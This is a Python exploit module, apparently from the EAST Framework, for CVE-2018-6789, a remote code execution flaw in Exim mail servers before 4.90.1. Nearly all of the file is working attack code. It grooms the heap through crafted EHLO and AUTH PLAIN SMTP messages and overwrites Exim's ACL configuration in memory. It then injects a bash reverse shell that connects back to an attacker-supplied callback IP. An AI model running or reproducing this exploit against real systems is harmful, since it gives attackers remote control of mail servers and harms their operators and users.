#! /usr/bin/env python
# -*- coding: utf_8 -*-
# The exploit is a part of EAST Framework - use only under the license agreement specified in LICENSE.txt in your EAST Framework distribution

import sys
import ssl
import time
import socket
import struct

sys.path.append('./core')
from Sploit import Sploit

INFO = {}
INFO['NAME'] = "efa_exim_rce"
INFO['DESCRIPTION'] = "Exim < 4.90.1 - Remote Code Execution"
INFO['VENDOR'] = "http://www.exim.org/"
INFO['DOWNLOAD_LINK'] = ''
INFO['LINKS'] = ['https://www.exploit-db.com/exploits/44571/']
INFO["CVE Name"] = "CVE-2018-6789"
INFO["NOTES"] = """Issue in the base64d function in the SMTP listener in Exim before 4.90.1. By sending a handcrafted message, a buffer overflow may happen. This can be used to execute code remotely.
"""

INFO['CHANGELOG'] = "03 May, 2018. Written by Gleg team."
INFO['PATH'] = 'Exploits/General/'

# Must be in every module, to be set by framework
OPTIONS = {}
OPTIONS["HOST"] = "127.0.0.1", dict(description = 'Target IP')
OPTIONS["PORT"] = 25, dict(description = 'Target Port')
OPTIONS["CALLBACK_IP"] = "192.168.1.43", dict(description = 'Callback IP')


class exploit(Sploit):
    def __init__(self, host = "", port=0, logger=None):
        Sploit.__init__(self, logger = logger)
        self.name = INFO['NAME']
        self.port = port
        self.host = host
        self.callback_ip = ''
        self.s = None
        self.f = None
    
    def args(self):
        self.args = Sploit.args(self, OPTIONS)
        self.host = self.args.get('HOST', self.host)
        self.port = int(self.args.get('PORT', self.port))
        self.callback_ip = self.args.get('CALLBACK_IP', OPTIONS["CALLBACK_IP"])
    
    def connect(self):
       self.s = socket.create_connection((self.host, self.port))
       self.f = self.s.makefile('rw', bufsize=0)
    
    def p(self, v):
        return struct.pack("<Q", v)
    
    def readuntil(self, delim='\n'):
       data = ''
       while not data.endswith(delim):
          data += self.f.read(1)
       return data
    
    def write(self, data):
        self.f.write(data + "\n")
    
    def ehlo(self, v):
       self.write("EHLO " + v)
       self.readuntil('HELP')
       
    def unrec(self, v):
        self.write(v)
        self.readuntil('command')
    
    def auth_plain(self, v):
       encode = v.encode('base64').replace('\n','').replace('=','')
       self.write("AUTH PLAIN " + encode)
       self.readuntil('data')
    
    def one_byte_overwrite(self):
        v = "C" * 8200
        encode = v.encode('base64').replace('\n','').replace('=','')
        encode = encode[:-1] + "PE"
        self.write("AUTH PLAIN " + encode)
        self.readuntil('data')

    def run(self):
        self.args()
        self.log('Attacking ' + self.host)
        
        if self.args['listener']:
            port = self.args['listener']['PORT']
        else:
            self.log('Please, enable listener to use this module')
            self.finish(False)
        
        self.connect()
        self.log('Connected to target')
        time.sleep(0.5)
        
        self.ehlo('A' * 8000)
        self.ehlo('B' * 16)
        self.log('Created free chunk size 0x6060 in unsorted bin')
        
        self.unrec('\xff' * 2000)
        self.ehlo('D' * 8200)
        self.one_byte_overwrite()
        self.log('Triggered 1 byte overwrite to extend target chunk size from 0x2020 to 0x20f0')
        
        fake_header  = self.p(0) 
        fake_header += self.p(0x1f51)
        self.auth_plain("E" * 176 + fake_header + "E" * (8200-176-len(fake_header)))
        self.log("Patched chunk with fake header so extended chunk can be freed")
        
        ehlo('F' * 16)
        self.log("Freed extended chunk")
        
        self.unrec("\xff" * 2000)
        self.unrec("\xff" * 2000)
        self.log("Occupied 1st and 3rd item in unsorted bin with fillers")
        
        fake_header  = self.p(0x4110)
        fake_header += self.p(0x1f50)   
        self.auth_plain("G" * 176 + fake_header + "G" * (8200-176-len(fake_header)))
        self.log("Patched chunk with fake header so extended chunk can be allocated")

        address = 0x55d7e5864480
        self.auth_plain("H" * 8200 + self.p(0x2021) + self.p(address)  + self.p(0x2008) + "H" * 184)
        self.log("Overwrite 'next' pointer with ACL store block address")

        self.ehlo("I" * 16)
        self.log("Freed the ACL store block")

        acl_smtp_rcpt_offset = 288
        cmd = "/bin/bash -c \"/bin/bash -i >& /dev/tcp/" + self.callback_ip + "/" + str(port) + " 0>&1\""
        cmd_expansion_string = "${run{" + cmd + "}}\0"
        self.auth_plain("J" * acl_smtp_rcpt_offset + cmd_expansion_string + "J" * (8200 - acl_smtp_rcpt_offset - len(cmd_expansion_string))) 
        self.log("Malloced ACL store block and overwrite the content of 'acl_smtp_rcpt' with shell expression")

        self.write("MAIL FROM:<test@pwned.com>")
        self.readuntil("OK")
        self.write("RCPT TO:<shell@pwned.com>")   
        self.log("Triggered RCPT TO and executing shell expression ...")
        
        time.sleep(3)
        self.finish(True)
        

if __name__ == '__main__':
    """
        By now we only have the tool mode for exploit..
        Later we would have standalone mode also.
    """
    print "Running exploit %s .. " % INFO['NAME']
    e = exploit("192.168.0.1", 80)
    e.run()
